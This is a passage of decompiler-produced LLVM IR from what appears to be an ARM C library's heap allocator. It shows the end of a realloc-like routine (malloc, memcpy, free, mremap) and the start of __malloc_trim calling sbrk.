  %v2_eef0 = inttoptr i32 %v1_eef0 to i32*
  %v3_eef0 = load i32, i32* %v2_eef0, align 4
  store i32 %v3_eef0, i32* %r1.global-to-local, align 4
  %v1_eef4 = add i32 %v3_eef0, 12
  %v2_eef4 = inttoptr i32 %v1_eef4 to i32*
  %v3_eef4 = load i32, i32* %v2_eef4, align 4
  store i32 %v3_eef4, i32* %r3.global-to-local, align 4
  %v9_eef8 = icmp eq i32 %v3_eef4, %v2_ee80
  %v1_eefc = add i32 %v2_ee80, 12
  %v2_eefc = inttoptr i32 %v1_eefc to i32*
  %v3_eefc = load i32, i32* %v2_eefc, align 4
  store i32 %v3_eefc, i32* %r2.global-to-local, align 4
  br i1 %v9_eef8, label %dec_label_pc_ef04, label %dec_label_pc_ef10

dec_label_pc_ef04:                                ; preds = %dec_label_pc_eef0
  %v1_ef04 = add i32 %v3_eefc, 8
  %v2_ef04 = inttoptr i32 %v1_ef04 to i32*
  %v3_ef04 = load i32, i32* %v2_ef04, align 4
  store i32 %v3_ef04, i32* %r3.global-to-local, align 4
  %v9_ef08 = icmp eq i32 %v3_ef04, %v2_ee80
  br i1 %v9_ef08, label %dec_label_pc_ef14, label %dec_label_pc_ef10

dec_label_pc_ef10:                                ; preds = %dec_label_pc_eef0, %dec_label_pc_ef04
  %v0_ef10 = call i32 @abort()
  store i32 %v0_ef10, i32* %r0.global-to-local, align 4
  %v0_ef14.pre = load i32, i32* @r1, align 4
  %v1_ef14.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_ef14

dec_label_pc_ef14:                                ; preds = %dec_label_pc_ef04, %dec_label_pc_ef10
  %v1_ef14 = phi i32 [ %v3_eefc, %dec_label_pc_ef04 ], [ %v1_ef14.pre, %dec_label_pc_ef10 ]
  %v0_ef14 = phi i32 [ %v3_eef0, %dec_label_pc_ef04 ], [ %v0_ef14.pre, %dec_label_pc_ef10 ]
  %v2_ef14 = add i32 %v1_ef14, 8
  %v3_ef14 = inttoptr i32 %v2_ef14 to i32*
  store i32 %v0_ef14, i32* %v3_ef14, align 4
  %v0_ef18 = load i32, i32* %r2.global-to-local, align 4
  %v1_ef18 = load i32, i32* %r1.global-to-local, align 4
  %v2_ef18 = add i32 %v1_ef18, 12
  %v3_ef18 = inttoptr i32 %v2_ef18 to i32*
  store i32 %v0_ef18, i32* %v3_ef18, align 4
  %v1_efd4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_efd4

dec_label_pc_ef20:                                ; preds = %dec_label_pc_ee90, %dec_label_pc_eee0, %dec_label_pc_eecc
  %v1_ef20 = add i32 %v1_ee64, -7
  store i32 %v1_ef20, i32* %r0.global-to-local, align 4
  %v1_ef24 = call i32 @malloc(i32 %v1_ef20)
  store i32 %v1_ef24, i32* @r0, align 4
  store i32 %v1_ef24, i32* %r1.global-to-local, align 4
  %v2_ef28 = icmp eq i32 %v1_ef24, 0
  br i1 %v2_ef28, label %bb31, label %dec_label_pc_ef34

bb31:                                             ; preds = %dec_label_pc_ef20
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_f108

dec_label_pc_ef34:                                ; preds = %dec_label_pc_ef20
  %v1_ef3c.pre = load i32, i32* @r4, align 4
  %v1_ef34 = add i32 %v1_ef24, -4
  %v2_ef34 = inttoptr i32 %v1_ef34 to i32*
  %v3_ef34 = load i32, i32* %v2_ef34, align 4
  store i32 %v3_ef34, i32* @r3, align 4
  %v1_ef38 = add i32 %v1_ef24, -8
  store i32 %v1_ef38, i32* @r7, align 4
  %v9_ef3c = icmp eq i32 %v1_ef38, %v1_ef3c.pre
  br i1 %v9_ef3c, label %.thread2, label %dec_label_pc_ef4c

.thread2:                                         ; preds = %dec_label_pc_ef34
  %v2_ef40 = and i32 %v3_ef34, -4
  store i32 %v2_ef40, i32* %r3.global-to-local, align 4
  %v2_ef44 = load i32, i32* @r6, align 4
  %v3_ef44 = add i32 %v2_ef44, %v2_ef40
  store i32 %v3_ef44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_efd4

dec_label_pc_ef4c:                                ; preds = %dec_label_pc_ef34
  %v0_ef4c = load i32, i32* @r6, align 4
  %v1_ef4c = add i32 %v0_ef4c, -4
  store i32 %v1_ef4c, i32* @r2, align 4
  %v3_ef50 = udiv i32 %v1_ef4c, 4
  store i32 %v3_ef50, i32* @ip, align 4
  %tmp37 = and i32 %v1_ef4c, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_ef58 = icmp ult i32 %v1_ef4c, 36
  %v3_ef58 = or i1 %tmp38, %v2_ef58
  %v0_ef68 = load i32, i32* @r5, align 4
  br i1 %v3_ef58, label %dec_label_pc_ef68, label %dec_label_pc_ef5c

dec_label_pc_ef5c:                                ; preds = %dec_label_pc_ef4c
  store i32 %v0_ef68, i32* @r1, align 4
  %v0_ef60 = call i32 @memcpy()
  store i32 %v0_ef60, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_ef68:                                ; preds = %dec_label_pc_ef4c
  %v1_ef68 = inttoptr i32 %v0_ef68 to i32*
  %v2_ef68 = load i32, i32* %v1_ef68, align 4
  store i32 %v2_ef68, i32* %r3.global-to-local, align 4
  %v2_ef6c = inttoptr i32 %v1_ef24 to i32*
  store i32 %v2_ef68, i32* %v2_ef6c, align 4
  %v0_ef70 = load i32, i32* @r5, align 4
  %v1_ef70 = add i32 %v0_ef70, 4
  %v2_ef70 = inttoptr i32 %v1_ef70 to i32*
  %v3_ef70 = load i32, i32* %v2_ef70, align 4
  store i32 %v3_ef70, i32* %r3.global-to-local, align 4
  %v1_ef74 = load i32, i32* %r1.global-to-local, align 4
  %v2_ef74 = add i32 %v1_ef74, 4
  %v3_ef74 = inttoptr i32 %v2_ef74 to i32*
  store i32 %v3_ef70, i32* %v3_ef74, align 4
  %v0_ef78 = load i32, i32* @r5, align 4
  %v1_ef78 = add i32 %v0_ef78, 8
  %v2_ef78 = inttoptr i32 %v1_ef78 to i32*
  %v3_ef78 = load i32, i32* %v2_ef78, align 4
  store i32 %v3_ef78, i32* %r3.global-to-local, align 4
  %v0_ef7c = load i32, i32* @ip, align 4
  %v1_ef80 = load i32, i32* %r1.global-to-local, align 4
  %v2_ef80 = add i32 %v1_ef80, 8
  %v3_ef80 = inttoptr i32 %v2_ef80 to i32*
  store i32 %v3_ef78, i32* %v3_ef80, align 4
  %tmp39 = icmp ult i32 %v0_ef7c, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_ef88

dec_label_pc_ef88:                                ; preds = %dec_label_pc_ef68
  %v0_ef88 = load i32, i32* @r5, align 4
  %v1_ef88 = add i32 %v0_ef88, 12
  %v2_ef88 = inttoptr i32 %v1_ef88 to i32*
  %v3_ef88 = load i32, i32* %v2_ef88, align 4
  store i32 %v3_ef88, i32* %r3.global-to-local, align 4
  %v1_ef8c = load i32, i32* %r1.global-to-local, align 4
  %v2_ef8c = add i32 %v1_ef8c, 12
  %v3_ef8c = inttoptr i32 %v2_ef8c to i32*
  store i32 %v3_ef88, i32* %v3_ef8c, align 4
  %v0_ef90 = load i32, i32* @r5, align 4
  %v1_ef90 = add i32 %v0_ef90, 16
  %v2_ef90 = inttoptr i32 %v1_ef90 to i32*
  %v3_ef90 = load i32, i32* %v2_ef90, align 4
  store i32 %v3_ef90, i32* %r3.global-to-local, align 4
  %v0_ef94 = load i32, i32* @ip, align 4
  %v1_ef98 = load i32, i32* %r1.global-to-local, align 4
  %v2_ef98 = add i32 %v1_ef98, 16
  %v3_ef98 = inttoptr i32 %v2_ef98 to i32*
  store i32 %v3_ef90, i32* %v3_ef98, align 4
  %tmp40 = icmp ult i32 %v0_ef94, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_efa0

dec_label_pc_efa0:                                ; preds = %dec_label_pc_ef88
  %v0_efa0 = load i32, i32* @r5, align 4
  %v1_efa0 = add i32 %v0_efa0, 20
  %v2_efa0 = inttoptr i32 %v1_efa0 to i32*
  %v3_efa0 = load i32, i32* %v2_efa0, align 4
  store i32 %v3_efa0, i32* %r3.global-to-local, align 4
  %v1_efa4 = load i32, i32* %r1.global-to-local, align 4
  %v2_efa4 = add i32 %v1_efa4, 20
  %v3_efa4 = inttoptr i32 %v2_efa4 to i32*
  store i32 %v3_efa0, i32* %v3_efa4, align 4
  %v0_efa8 = load i32, i32* @r5, align 4
  %v1_efa8 = add i32 %v0_efa8, 24
  %v2_efa8 = inttoptr i32 %v1_efa8 to i32*
  %v3_efa8 = load i32, i32* %v2_efa8, align 4
  store i32 %v3_efa8, i32* %r3.global-to-local, align 4
  %v1_efac = load i32, i32* %r1.global-to-local, align 4
  %v2_efac = add i32 %v1_efac, 24
  %v3_efac = inttoptr i32 %v2_efac to i32*
  store i32 %v3_efa8, i32* %v3_efac, align 4
  %v0_efb0 = load i32, i32* @ip, align 4
  %v7_efb0 = icmp eq i32 %v0_efb0, 9
  br i1 %v7_efb0, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_efa0
  %v1_efb4 = load i32, i32* @r5, align 4
  %v2_efb4 = add i32 %v1_efb4, 28
  %v3_efb4 = inttoptr i32 %v2_efb4 to i32*
  %v4_efb4 = load i32, i32* %v3_efb4, align 4
  store i32 %v4_efb4, i32* %r3.global-to-local, align 4
  %v2_efb8 = load i32, i32* %r1.global-to-local, align 4
  %v3_efb8 = add i32 %v2_efb8, 28
  %v4_efb8 = inttoptr i32 %v3_efb8 to i32*
  store i32 %v4_efb4, i32* %v4_efb8, align 4
  %v1_efbc = load i32, i32* @r5, align 4
  %v2_efbc = add i32 %v1_efbc, 32
  %v3_efbc = inttoptr i32 %v2_efbc to i32*
  %v4_efbc = load i32, i32* %v3_efbc, align 4
  store i32 %v4_efbc, i32* %r3.global-to-local, align 4
  %v2_efc0 = load i32, i32* %r1.global-to-local, align 4
  %v3_efc0 = add i32 %v2_efc0, 32
  %v4_efc0 = inttoptr i32 %v3_efc0 to i32*
  store i32 %v4_efbc, i32* %v4_efc0, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_efa0, %dec_label_pc_ef88, %dec_label_pc_ef68, %dec_label_pc_ef5c, %bb32
  %v0_efc4 = load i32, i32* @r5, align 4
  store i32 %v0_efc4, i32* @r0, align 4
  %v0_efc8 = call i32 @free()
  store i32 %v0_efc8, i32* %r0.global-to-local, align 4
  %v0_efcc = load i32, i32* @r7, align 4
  %v1_efcc = add i32 %v0_efcc, 8
  store i32 %v1_efcc, i32* @r4, align 4
  br label %dec_label_pc_f108

dec_label_pc_efd4:                                ; preds = %bb30, %.thread2, %dec_label_pc_ef14
  %v0_efe8 = phi i32 [ %v3_ef44, %.thread2 ], [ %v1_ee5c, %bb30 ], [ %v1_efd4.pre, %dec_label_pc_ef14 ]
  %v0_efd4 = load i32, i32* @sb, align 4
  %v2_efd4 = sub i32 %v0_efe8, %v0_efd4
  store i32 %v2_efd4, i32* %r1.global-to-local, align 4
  %v0_efdc = load i32, i32* @sl, align 4
  %v1_efdc = add i32 %v0_efdc, 4
  %v2_efdc = inttoptr i32 %v1_efdc to i32*
  %v3_efdc = load i32, i32* %v2_efdc, align 4
  %tmp41 = icmp ugt i32 %v2_efd4, 15
  %v1_f004 = urem i32 %v3_efdc, 2
  store i32 %v1_f004, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_f004, label %dec_label_pc_efe4

dec_label_pc_efe4:                                ; preds = %dec_label_pc_efd4
  %v2_efe8 = or i32 %v1_f004, %v0_efe8
  store i32 %v2_efe8, i32* %r3.global-to-local, align 4
  store i32 %v2_efe8, i32* %v2_efdc, align 4
  %v0_eff0 = load i32, i32* @sl, align 4
  %v1_eff0 = load i32, i32* %r0.global-to-local, align 4
  %v2_eff0 = add i32 %v1_eff0, %v0_eff0
  store i32 %v2_eff0, i32* %r2.global-to-local, align 4
  %v1_eff4 = add i32 %v2_eff0, 4
  %v2_eff4 = inttoptr i32 %v1_eff4 to i32*
  %v3_eff4 = load i32, i32* %v2_eff4, align 4
  %v1_eff8 = or i32 %v3_eff4, 1
  store i32 %v1_eff8, i32* %r3.global-to-local, align 4
  store i32 %v1_eff8, i32* %v2_eff4, align 4
  br label %dec_label_pc_f034

dec_label_pc_f004:                                ; preds = %dec_label_pc_efd4
  %v2_f008 = add i32 %v0_efdc, %v0_efd4
  store i32 %v2_f008, i32* %r0.global-to-local, align 4
  %v2_f00c = or i32 %v1_f004, %v0_efd4
  store i32 %v2_f00c, i32* %r3.global-to-local, align 4
  %v1_f010 = or i32 %v2_efd4, 1
  store i32 %v1_f010, i32* %r2.global-to-local, align 4
  store i32 %v2_f00c, i32* %v2_efdc, align 4
  %v0_f018 = load i32, i32* %r2.global-to-local, align 4
  %v1_f018 = load i32, i32* %r0.global-to-local, align 4
  %v2_f018 = add i32 %v1_f018, 4
  %v3_f018 = inttoptr i32 %v2_f018 to i32*
  store i32 %v0_f018, i32* %v3_f018, align 4
  %v0_f01c = load i32, i32* %r0.global-to-local, align 4
  %v1_f01c = load i32, i32* %r1.global-to-local, align 4
  %v2_f01c = add i32 %v1_f01c, %v0_f01c
  store i32 %v2_f01c, i32* %r2.global-to-local, align 4
  %v1_f020 = add i32 %v2_f01c, 4
  %v2_f020 = inttoptr i32 %v1_f020 to i32*
  %v3_f020 = load i32, i32* %v2_f020, align 4
  %v1_f024 = or i32 %v3_f020, 1
  store i32 %v1_f024, i32* %r3.global-to-local, align 4
  store i32 %v1_f024, i32* %v2_f020, align 4
  %v0_f02c = load i32, i32* %r0.global-to-local, align 4
  %v1_f02c = add i32 %v0_f02c, 8
  store i32 %v1_f02c, i32* @r0, align 4
  %v0_f030 = call i32 @free()
  store i32 %v0_f030, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f034

dec_label_pc_f034:                                ; preds = %dec_label_pc_efe4, %dec_label_pc_f004
  %v0_f034 = load i32, i32* @sl, align 4
  %v1_f034 = add i32 %v0_f034, 8
  store i32 %v1_f034, i32* @r4, align 4
  br label %dec_label_pc_f108

dec_label_pc_f03c:                                ; preds = %bb29
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r1.global-to-local, align 4
  %v4_f044 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), align 4
  store i32 %v4_f044, i32* @r8, align 4
  %v2_f048 = inttoptr i32 %v1_ee58 to i32*
  %v3_f048 = load i32, i32* %v2_f048, align 4
  store i32 %v3_f048, i32* @r4, align 4
  %v1_f04c = add i32 %v4_f044, 860
  %v2_f04c = inttoptr i32 %v1_f04c to i32*
  %v3_f04c = load i32, i32* %v2_f04c, align 4
  %v1_f050 = add i32 %v3_f048, 4
  %v1_f054 = add i32 %v3_f04c, -1
  store i32 %v1_f054, i32* %r2.global-to-local, align 4
  %v2_f058 = add i32 %v1_f050, %v1_f054
  %v1_f05c = load i32, i32* @sb, align 4
  %v2_f05c = add i32 %v2_f058, %v1_f05c
  store i32 %v2_f05c, i32* %r3.global-to-local, align 4
  %v2_f060 = sub i32 0, %v3_f04c
  %v3_f060 = and i32 %v2_f05c, %v2_f060
  store i32 %v3_f060, i32* @r7, align 4
  %v2_f064 = sub i32 %v3_f060, %v3_f048
  store i32 %v2_f064, i32* @fp, align 4
  %v9_f068 = icmp eq i32 %v1_ee5c, %v2_f064
  br i1 %v9_f068, label %dec_label_pc_f0dc, label %dec_label_pc_f070

dec_label_pc_f070:                                ; preds = %dec_label_pc_f03c
  %v2_f070 = sub i32 %v1_ee58, %v3_f048
  store i32 %v2_f070, i32* %r0.global-to-local, align 4
  %v2_f074 = add i32 %v3_f048, %v1_ee5c
  store i32 %v2_f074, i32* %r1.global-to-local, align 4
  store i32 %v3_f060, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_f080 = call i32 @mremap(i32 %v2_f070, i32 %v2_f074, i32 %v3_f060, i32 1)
  store i32 %v4_f080, i32* %r0.global-to-local, align 4
  %v7_f084 = icmp eq i32 %v4_f080, -1
  br i1 %v7_f084, label %dec_label_pc_f0d0, label %dec_label_pc_f08c

dec_label_pc_f08c:                                ; preds = %dec_label_pc_f070
  %v1_f08c = load i32, i32* @r4, align 4
  %v2_f08c = add i32 %v1_f08c, %v4_f080
  store i32 %v2_f08c, i32* %r0.global-to-local, align 4
  %v0_f090 = load i32, i32* @fp, align 4
  %v1_f090 = or i32 %v0_f090, 2
  store i32 %v1_f090, i32* %r3.global-to-local, align 4
  %v2_f094 = add i32 %v2_f08c, 4
  %v3_f094 = inttoptr i32 %v2_f094 to i32*
  store i32 %v1_f090, i32* %v3_f094, align 4
  %v0_f098 = load i32, i32* @r8, align 4
  %v1_f098 = add i32 %v0_f098, 868
  %v2_f098 = inttoptr i32 %v1_f098 to i32*
  %v3_f098 = load i32, i32* %v2_f098, align 4
  store i32 %v3_f098, i32* %r3.global-to-local, align 4
  %v1_f09c = add i32 %v0_f098, 880
  %v2_f09c = inttoptr i32 %v1_f09c to i32*
  %v3_f09c = load i32, i32* %v2_f09c, align 4
  store i32 %v3_f09c, i32* %r2.global-to-local, align 4
  %v0_f0a0 = load i32, i32* @r6, align 4
  %v2_f0a0 = sub i32 %v3_f098, %v0_f0a0
  store i32 %v2_f0a0, i32* %r3.global-to-local, align 4
  %v1_f0a4 = load i32, i32* @r7, align 4
  %v2_f0a4 = add i32 %v1_f0a4, %v2_f0a0
  store i32 %v2_f0a4, i32* %r1.global-to-local, align 4
  %v1_f0a8 = add i32 %v0_f098, 872
  %v2_f0a8 = inttoptr i32 %v1_f0a8 to i32*
  %v3_f0a8 = load i32, i32* %v2_f0a8, align 4
  store i32 %v3_f0a8, i32* %r3.global-to-local, align 4
  %v1_f0b0 = add i32 %v0_f098, 884
  %v2_f0b0 = inttoptr i32 %v1_f0b0 to i32*
  %v3_f0b0 = load i32, i32* %v2_f0b0, align 4
  store i32 %v3_f0b0, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_f0a4, %v3_f09c
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_f08c
  store i32 %v2_f0a4, i32* %v2_f09c, align 4
  %v0_f0b8.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_f0b8.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_f08c, %bb33
  %v1_f0b8 = phi i32 [ %v0_f098, %dec_label_pc_f08c ], [ %v1_f0b8.pre, %bb33 ]
  %v0_f0b8 = phi i32 [ %v2_f0a4, %dec_label_pc_f08c ], [ %v0_f0b8.pre, %bb33 ]
  %v2_f0b8 = add i32 %v1_f0b8, 868
  %v3_f0b8 = inttoptr i32 %v2_f0b8 to i32*
  store i32 %v0_f0b8, i32* %v3_f0b8, align 4
  %v0_f0bc = load i32, i32* %r1.global-to-local, align 4
  %v1_f0bc = load i32, i32* %r3.global-to-local, align 4
  %v2_f0bc = add i32 %v1_f0bc, %v0_f0bc
  store i32 %v2_f0bc, i32* %r1.global-to-local, align 4
  %v1_f0c0 = load i32, i32* %r2.global-to-local, align 4
  %v0_f0c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_f0c4 = add i32 %v0_f0c4, 8
  store i32 %v1_f0c4, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_f0bc, %v1_f0c0
  br i1 %tmp43, label %bb35, label %dec_label_pc_f108

bb35:                                             ; preds = %bb34
  %v5_f0c8 = load i32, i32* @r8, align 4
  %v6_f0c8 = add i32 %v5_f0c8, 884
  %v7_f0c8 = inttoptr i32 %v6_f0c8 to i32*
  store i32 %v2_f0bc, i32* %v7_f0c8, align 4
  br label %dec_label_pc_f108

dec_label_pc_f0d0:                                ; preds = %dec_label_pc_f070
  %v0_f0d0 = load i32, i32* @sb, align 4
  %v1_f0d0 = add i32 %v0_f0d0, 4
  store i32 %v1_f0d0, i32* %r3.global-to-local, align 4
  %v0_f0d4 = load i32, i32* @r6, align 4
  %v3_f0d4 = icmp ult i32 %v0_f0d4, %v1_f0d0
  br i1 %v3_f0d4, label %dec_label_pc_f0e4, label %dec_label_pc_f0d0.dec_label_pc_f0dc_crit_edge

dec_label_pc_f0d0.dec_label_pc_f0dc_crit_edge:    ; preds = %dec_label_pc_f0d0
  %v0_f0dc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f0dc

dec_label_pc_f0dc:                                ; preds = %dec_label_pc_f0d0.dec_label_pc_f0dc_crit_edge, %dec_label_pc_f03c
  %v0_f0dc = phi i32 [ %v0_f0dc.pre, %dec_label_pc_f0d0.dec_label_pc_f0dc_crit_edge ], [ %v0_ee44, %dec_label_pc_f03c ]
  store i32 %v0_f0dc, i32* @r4, align 4
  br label %dec_label_pc_f108

dec_label_pc_f0e4:                                ; preds = %dec_label_pc_f0d0
  %v1_f0e4 = add i32 %v0_f0d0, -7
  store i32 %v1_f0e4, i32* %r0.global-to-local, align 4
  %v1_f0e8 = call i32 @malloc(i32 %v1_f0e4)
  store i32 %v1_f0e8, i32* @r0, align 4
  store i32 %v1_f0e8, i32* @r4, align 4
  %v2_f0ec = icmp eq i32 %v1_f0e8, 0
  br i1 %v2_f0ec, label %dec_label_pc_f108, label %dec_label_pc_f0f4

dec_label_pc_f0f4:                                ; preds = %dec_label_pc_f0e4
  %v0_f0f4 = load i32, i32* @r6, align 4
  %v1_f0f4 = add i32 %v0_f0f4, -8
  store i32 %v1_f0f4, i32* @r2, align 4
  %v0_f0f8 = load i32, i32* @r5, align 4
  store i32 %v0_f0f8, i32* @r1, align 4
  %v0_f0fc = call i32 @memcpy()
  %v0_f100 = load i32, i32* @r5, align 4
  store i32 %v0_f100, i32* @r0, align 4
  %v0_f104 = call i32 @free()
  store i32 %v0_f104, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f108

dec_label_pc_f108:                                ; preds = %bb31, %bb35, %bb34, %dec_label_pc_f0e4, %dec_label_pc_f0dc, %dec_label_pc_f034, %.thread6, %dec_label_pc_eea4, %dec_label_pc_f0f4
  store i32 %v2_edf0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r2.global-to-local, align 4
  %v4_f118 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 48) to i32*), align 4
  store i32 %v4_f118, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_f118)
  br label %dec_label_pc_f124

dec_label_pc_f124:                                ; preds = %dec_label_pc_ee24, %dec_label_pc_edcc, %dec_label_pc_edb4, %dec_label_pc_f108
  %v0_f124 = load i32, i32* @r4, align 4
  store i32 %v0_f124, i32* %r0.global-to-local, align 4
  store i32 %v3_ed94, i32* @r4, align 4
  store i32 %v6_ed94, i32* @r5, align 4
  store i32 %v9_ed94, i32* @r6, align 4
  store i32 %v12_ed94, i32* @r7, align 4
  store i32 %v15_ed94, i32* @r8, align 4
  store i32 %v18_ed94, i32* @sb, align 4
  store i32 %v21_ed94, i32* @sl, align 4
  store i32 %v24_ed94, i32* @fp, align 4
  store i32 %v27_ed94, i32* @lr, align 4
  ret i32 %v0_f124

; uselistorder directives
  uselistorder i32 %v2_f0bc, { 1, 0, 2 }
  uselistorder i32 %v2_f0a4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_f080, { 1, 0, 2 }
  uselistorder i32 %v3_f060, { 1, 0, 2, 3 }
  uselistorder i32 %v1_f004, { 2, 1, 0 }
  uselistorder i32 %v2_efd4, { 1, 0, 2 }
  uselistorder i32 %v0_ef68, { 1, 0 }
  uselistorder i32 %v1_ef24, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_ee88, { 0, 2, 1, 3 }
  uselistorder i32 %v2_ee80, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_ee64, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_ee5c, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_ee58, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_ee48, { 1, 0 }
  uselistorder i32 %v0_ee44, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_ee1c, { 1, 0 }
  uselistorder i32 %v0_edac, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 23, 13, 15, 14, 16, 22, 24, 17, 18, 19, 20, 21, 27, 26, 25, 28, 30, 29 }
  uselistorder label %dec_label_pc_f124, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_f108, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_f034, { 1, 0 }
  uselistorder label %dec_label_pc_efd4, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_ef20, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ef14, { 1, 0 }
  uselistorder label %dec_label_pc_ef10, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_f138(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f138:
  %v0_f138 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f138, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_f138
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_f138, %bb
  %v10_f150 = phi i32 [ %arg1, %dec_label_pc_f138 ], [ 0, %bb ]
  ret i32 %v10_f150

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_f154 = add i32 %arg2, 44
  %v2_f154 = inttoptr i32 %v1_f154 to i32*
  %v3_f154 = load i32, i32* %v2_f154, align 4
  %v3_f158 = load i32, i32* @r4, align 4
  store i32 %v3_f158, i32* %stack_var_-20, align 4
  %v12_f158 = load i32, i32* @r7, align 4
  %v1_f15c = add i32 %v3_f154, 4
  %v2_f15c = inttoptr i32 %v1_f15c to i32*
  %v3_f15c = load i32, i32* %v2_f15c, align 4
  %v1_f160 = add i32 %arg2, 860
  %v2_f160 = inttoptr i32 %v1_f160 to i32*
  %v3_f160 = load i32, i32* %v2_f160, align 4
  store i32 %v3_f160, i32* @r4, align 4
  %v1_f164 = and i32 %v3_f15c, -4
  store i32 %v1_f164, i32* @r6, align 4
  %v1_f168 = add i32 %v1_f164, -17
  %v2_f16c = add i32 %v1_f168, %v3_f160
  store i32 %v2_f16c, i32* @r3, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_f178 = sub i32 %v2_f16c, %arg1
  store i32 %v3_f160, i32* %r1.global-to-local, align 4
  %v2_f180 = udiv i32 %v2_f178, %v3_f160
  %v1_f184 = add i32 %v2_f180, -1
  store i32 %v1_f184, i32* %r0.global-to-local, align 4
  %v2_f188 = mul i32 %v1_f184, %v3_f160
  store i32 %v2_f188, i32* @r7, align 4
  %v2_f18c = icmp eq i32 %v2_f188, 0
  store i1 %v2_f18c, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_f188, 1
  br i1 %tmp8, label %dec_label_pc_f1f4, label %dec_label_pc_f194

dec_label_pc_f194:                                ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_f198 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_f198, i32* %r0.global-to-local, align 4
  %v0_f19c = load i32, i32* @r5, align 4
  %v1_f19c = add i32 %v0_f19c, 44
  %v2_f19c = inttoptr i32 %v1_f19c to i32*
  %v3_f19c = load i32, i32* %v2_f19c, align 4
  %v0_f1a0 = load i32, i32* @r6, align 4
  %v2_f1a0 = add i32 %v0_f1a0, %v3_f19c
  store i32 %v2_f1a0, i32* @r3, align 4
  %v9_f1a4 = icmp eq i32 %v1_f198, %v2_f1a0
  store i1 %v9_f1a4, i1* @cpsr_z, align 1
  store i32 %v1_f198, i32* @r4, align 4
  br i1 %v9_f1a4, label %dec_label_pc_f1b0, label %dec_label_pc_f1f4

dec_label_pc_f1b0:                                ; preds = %dec_label_pc_f194
  %v0_f1b0 = load i32, i32* @r7, align 4
  %v1_f1b0 = sub i32 0, %v0_f1b0
  store i32 %v1_f1b0, i32* %r0.global-to-local, align 4
  %v1_f1b4 = call i32 @__GI_sbrk(i32 %v1_f1b0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_f1bc = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_f1bc, i32* %r0.global-to-local, align 4
  %v7_f1c0 = icmp eq i32 %v1_f1bc, -1
  store i1 %v7_f1c0, i1* @cpsr_z, align 1
  br i1 %v7_f1c0, label %dec_label_pc_f1f4, label %dec_label_pc_f1c8

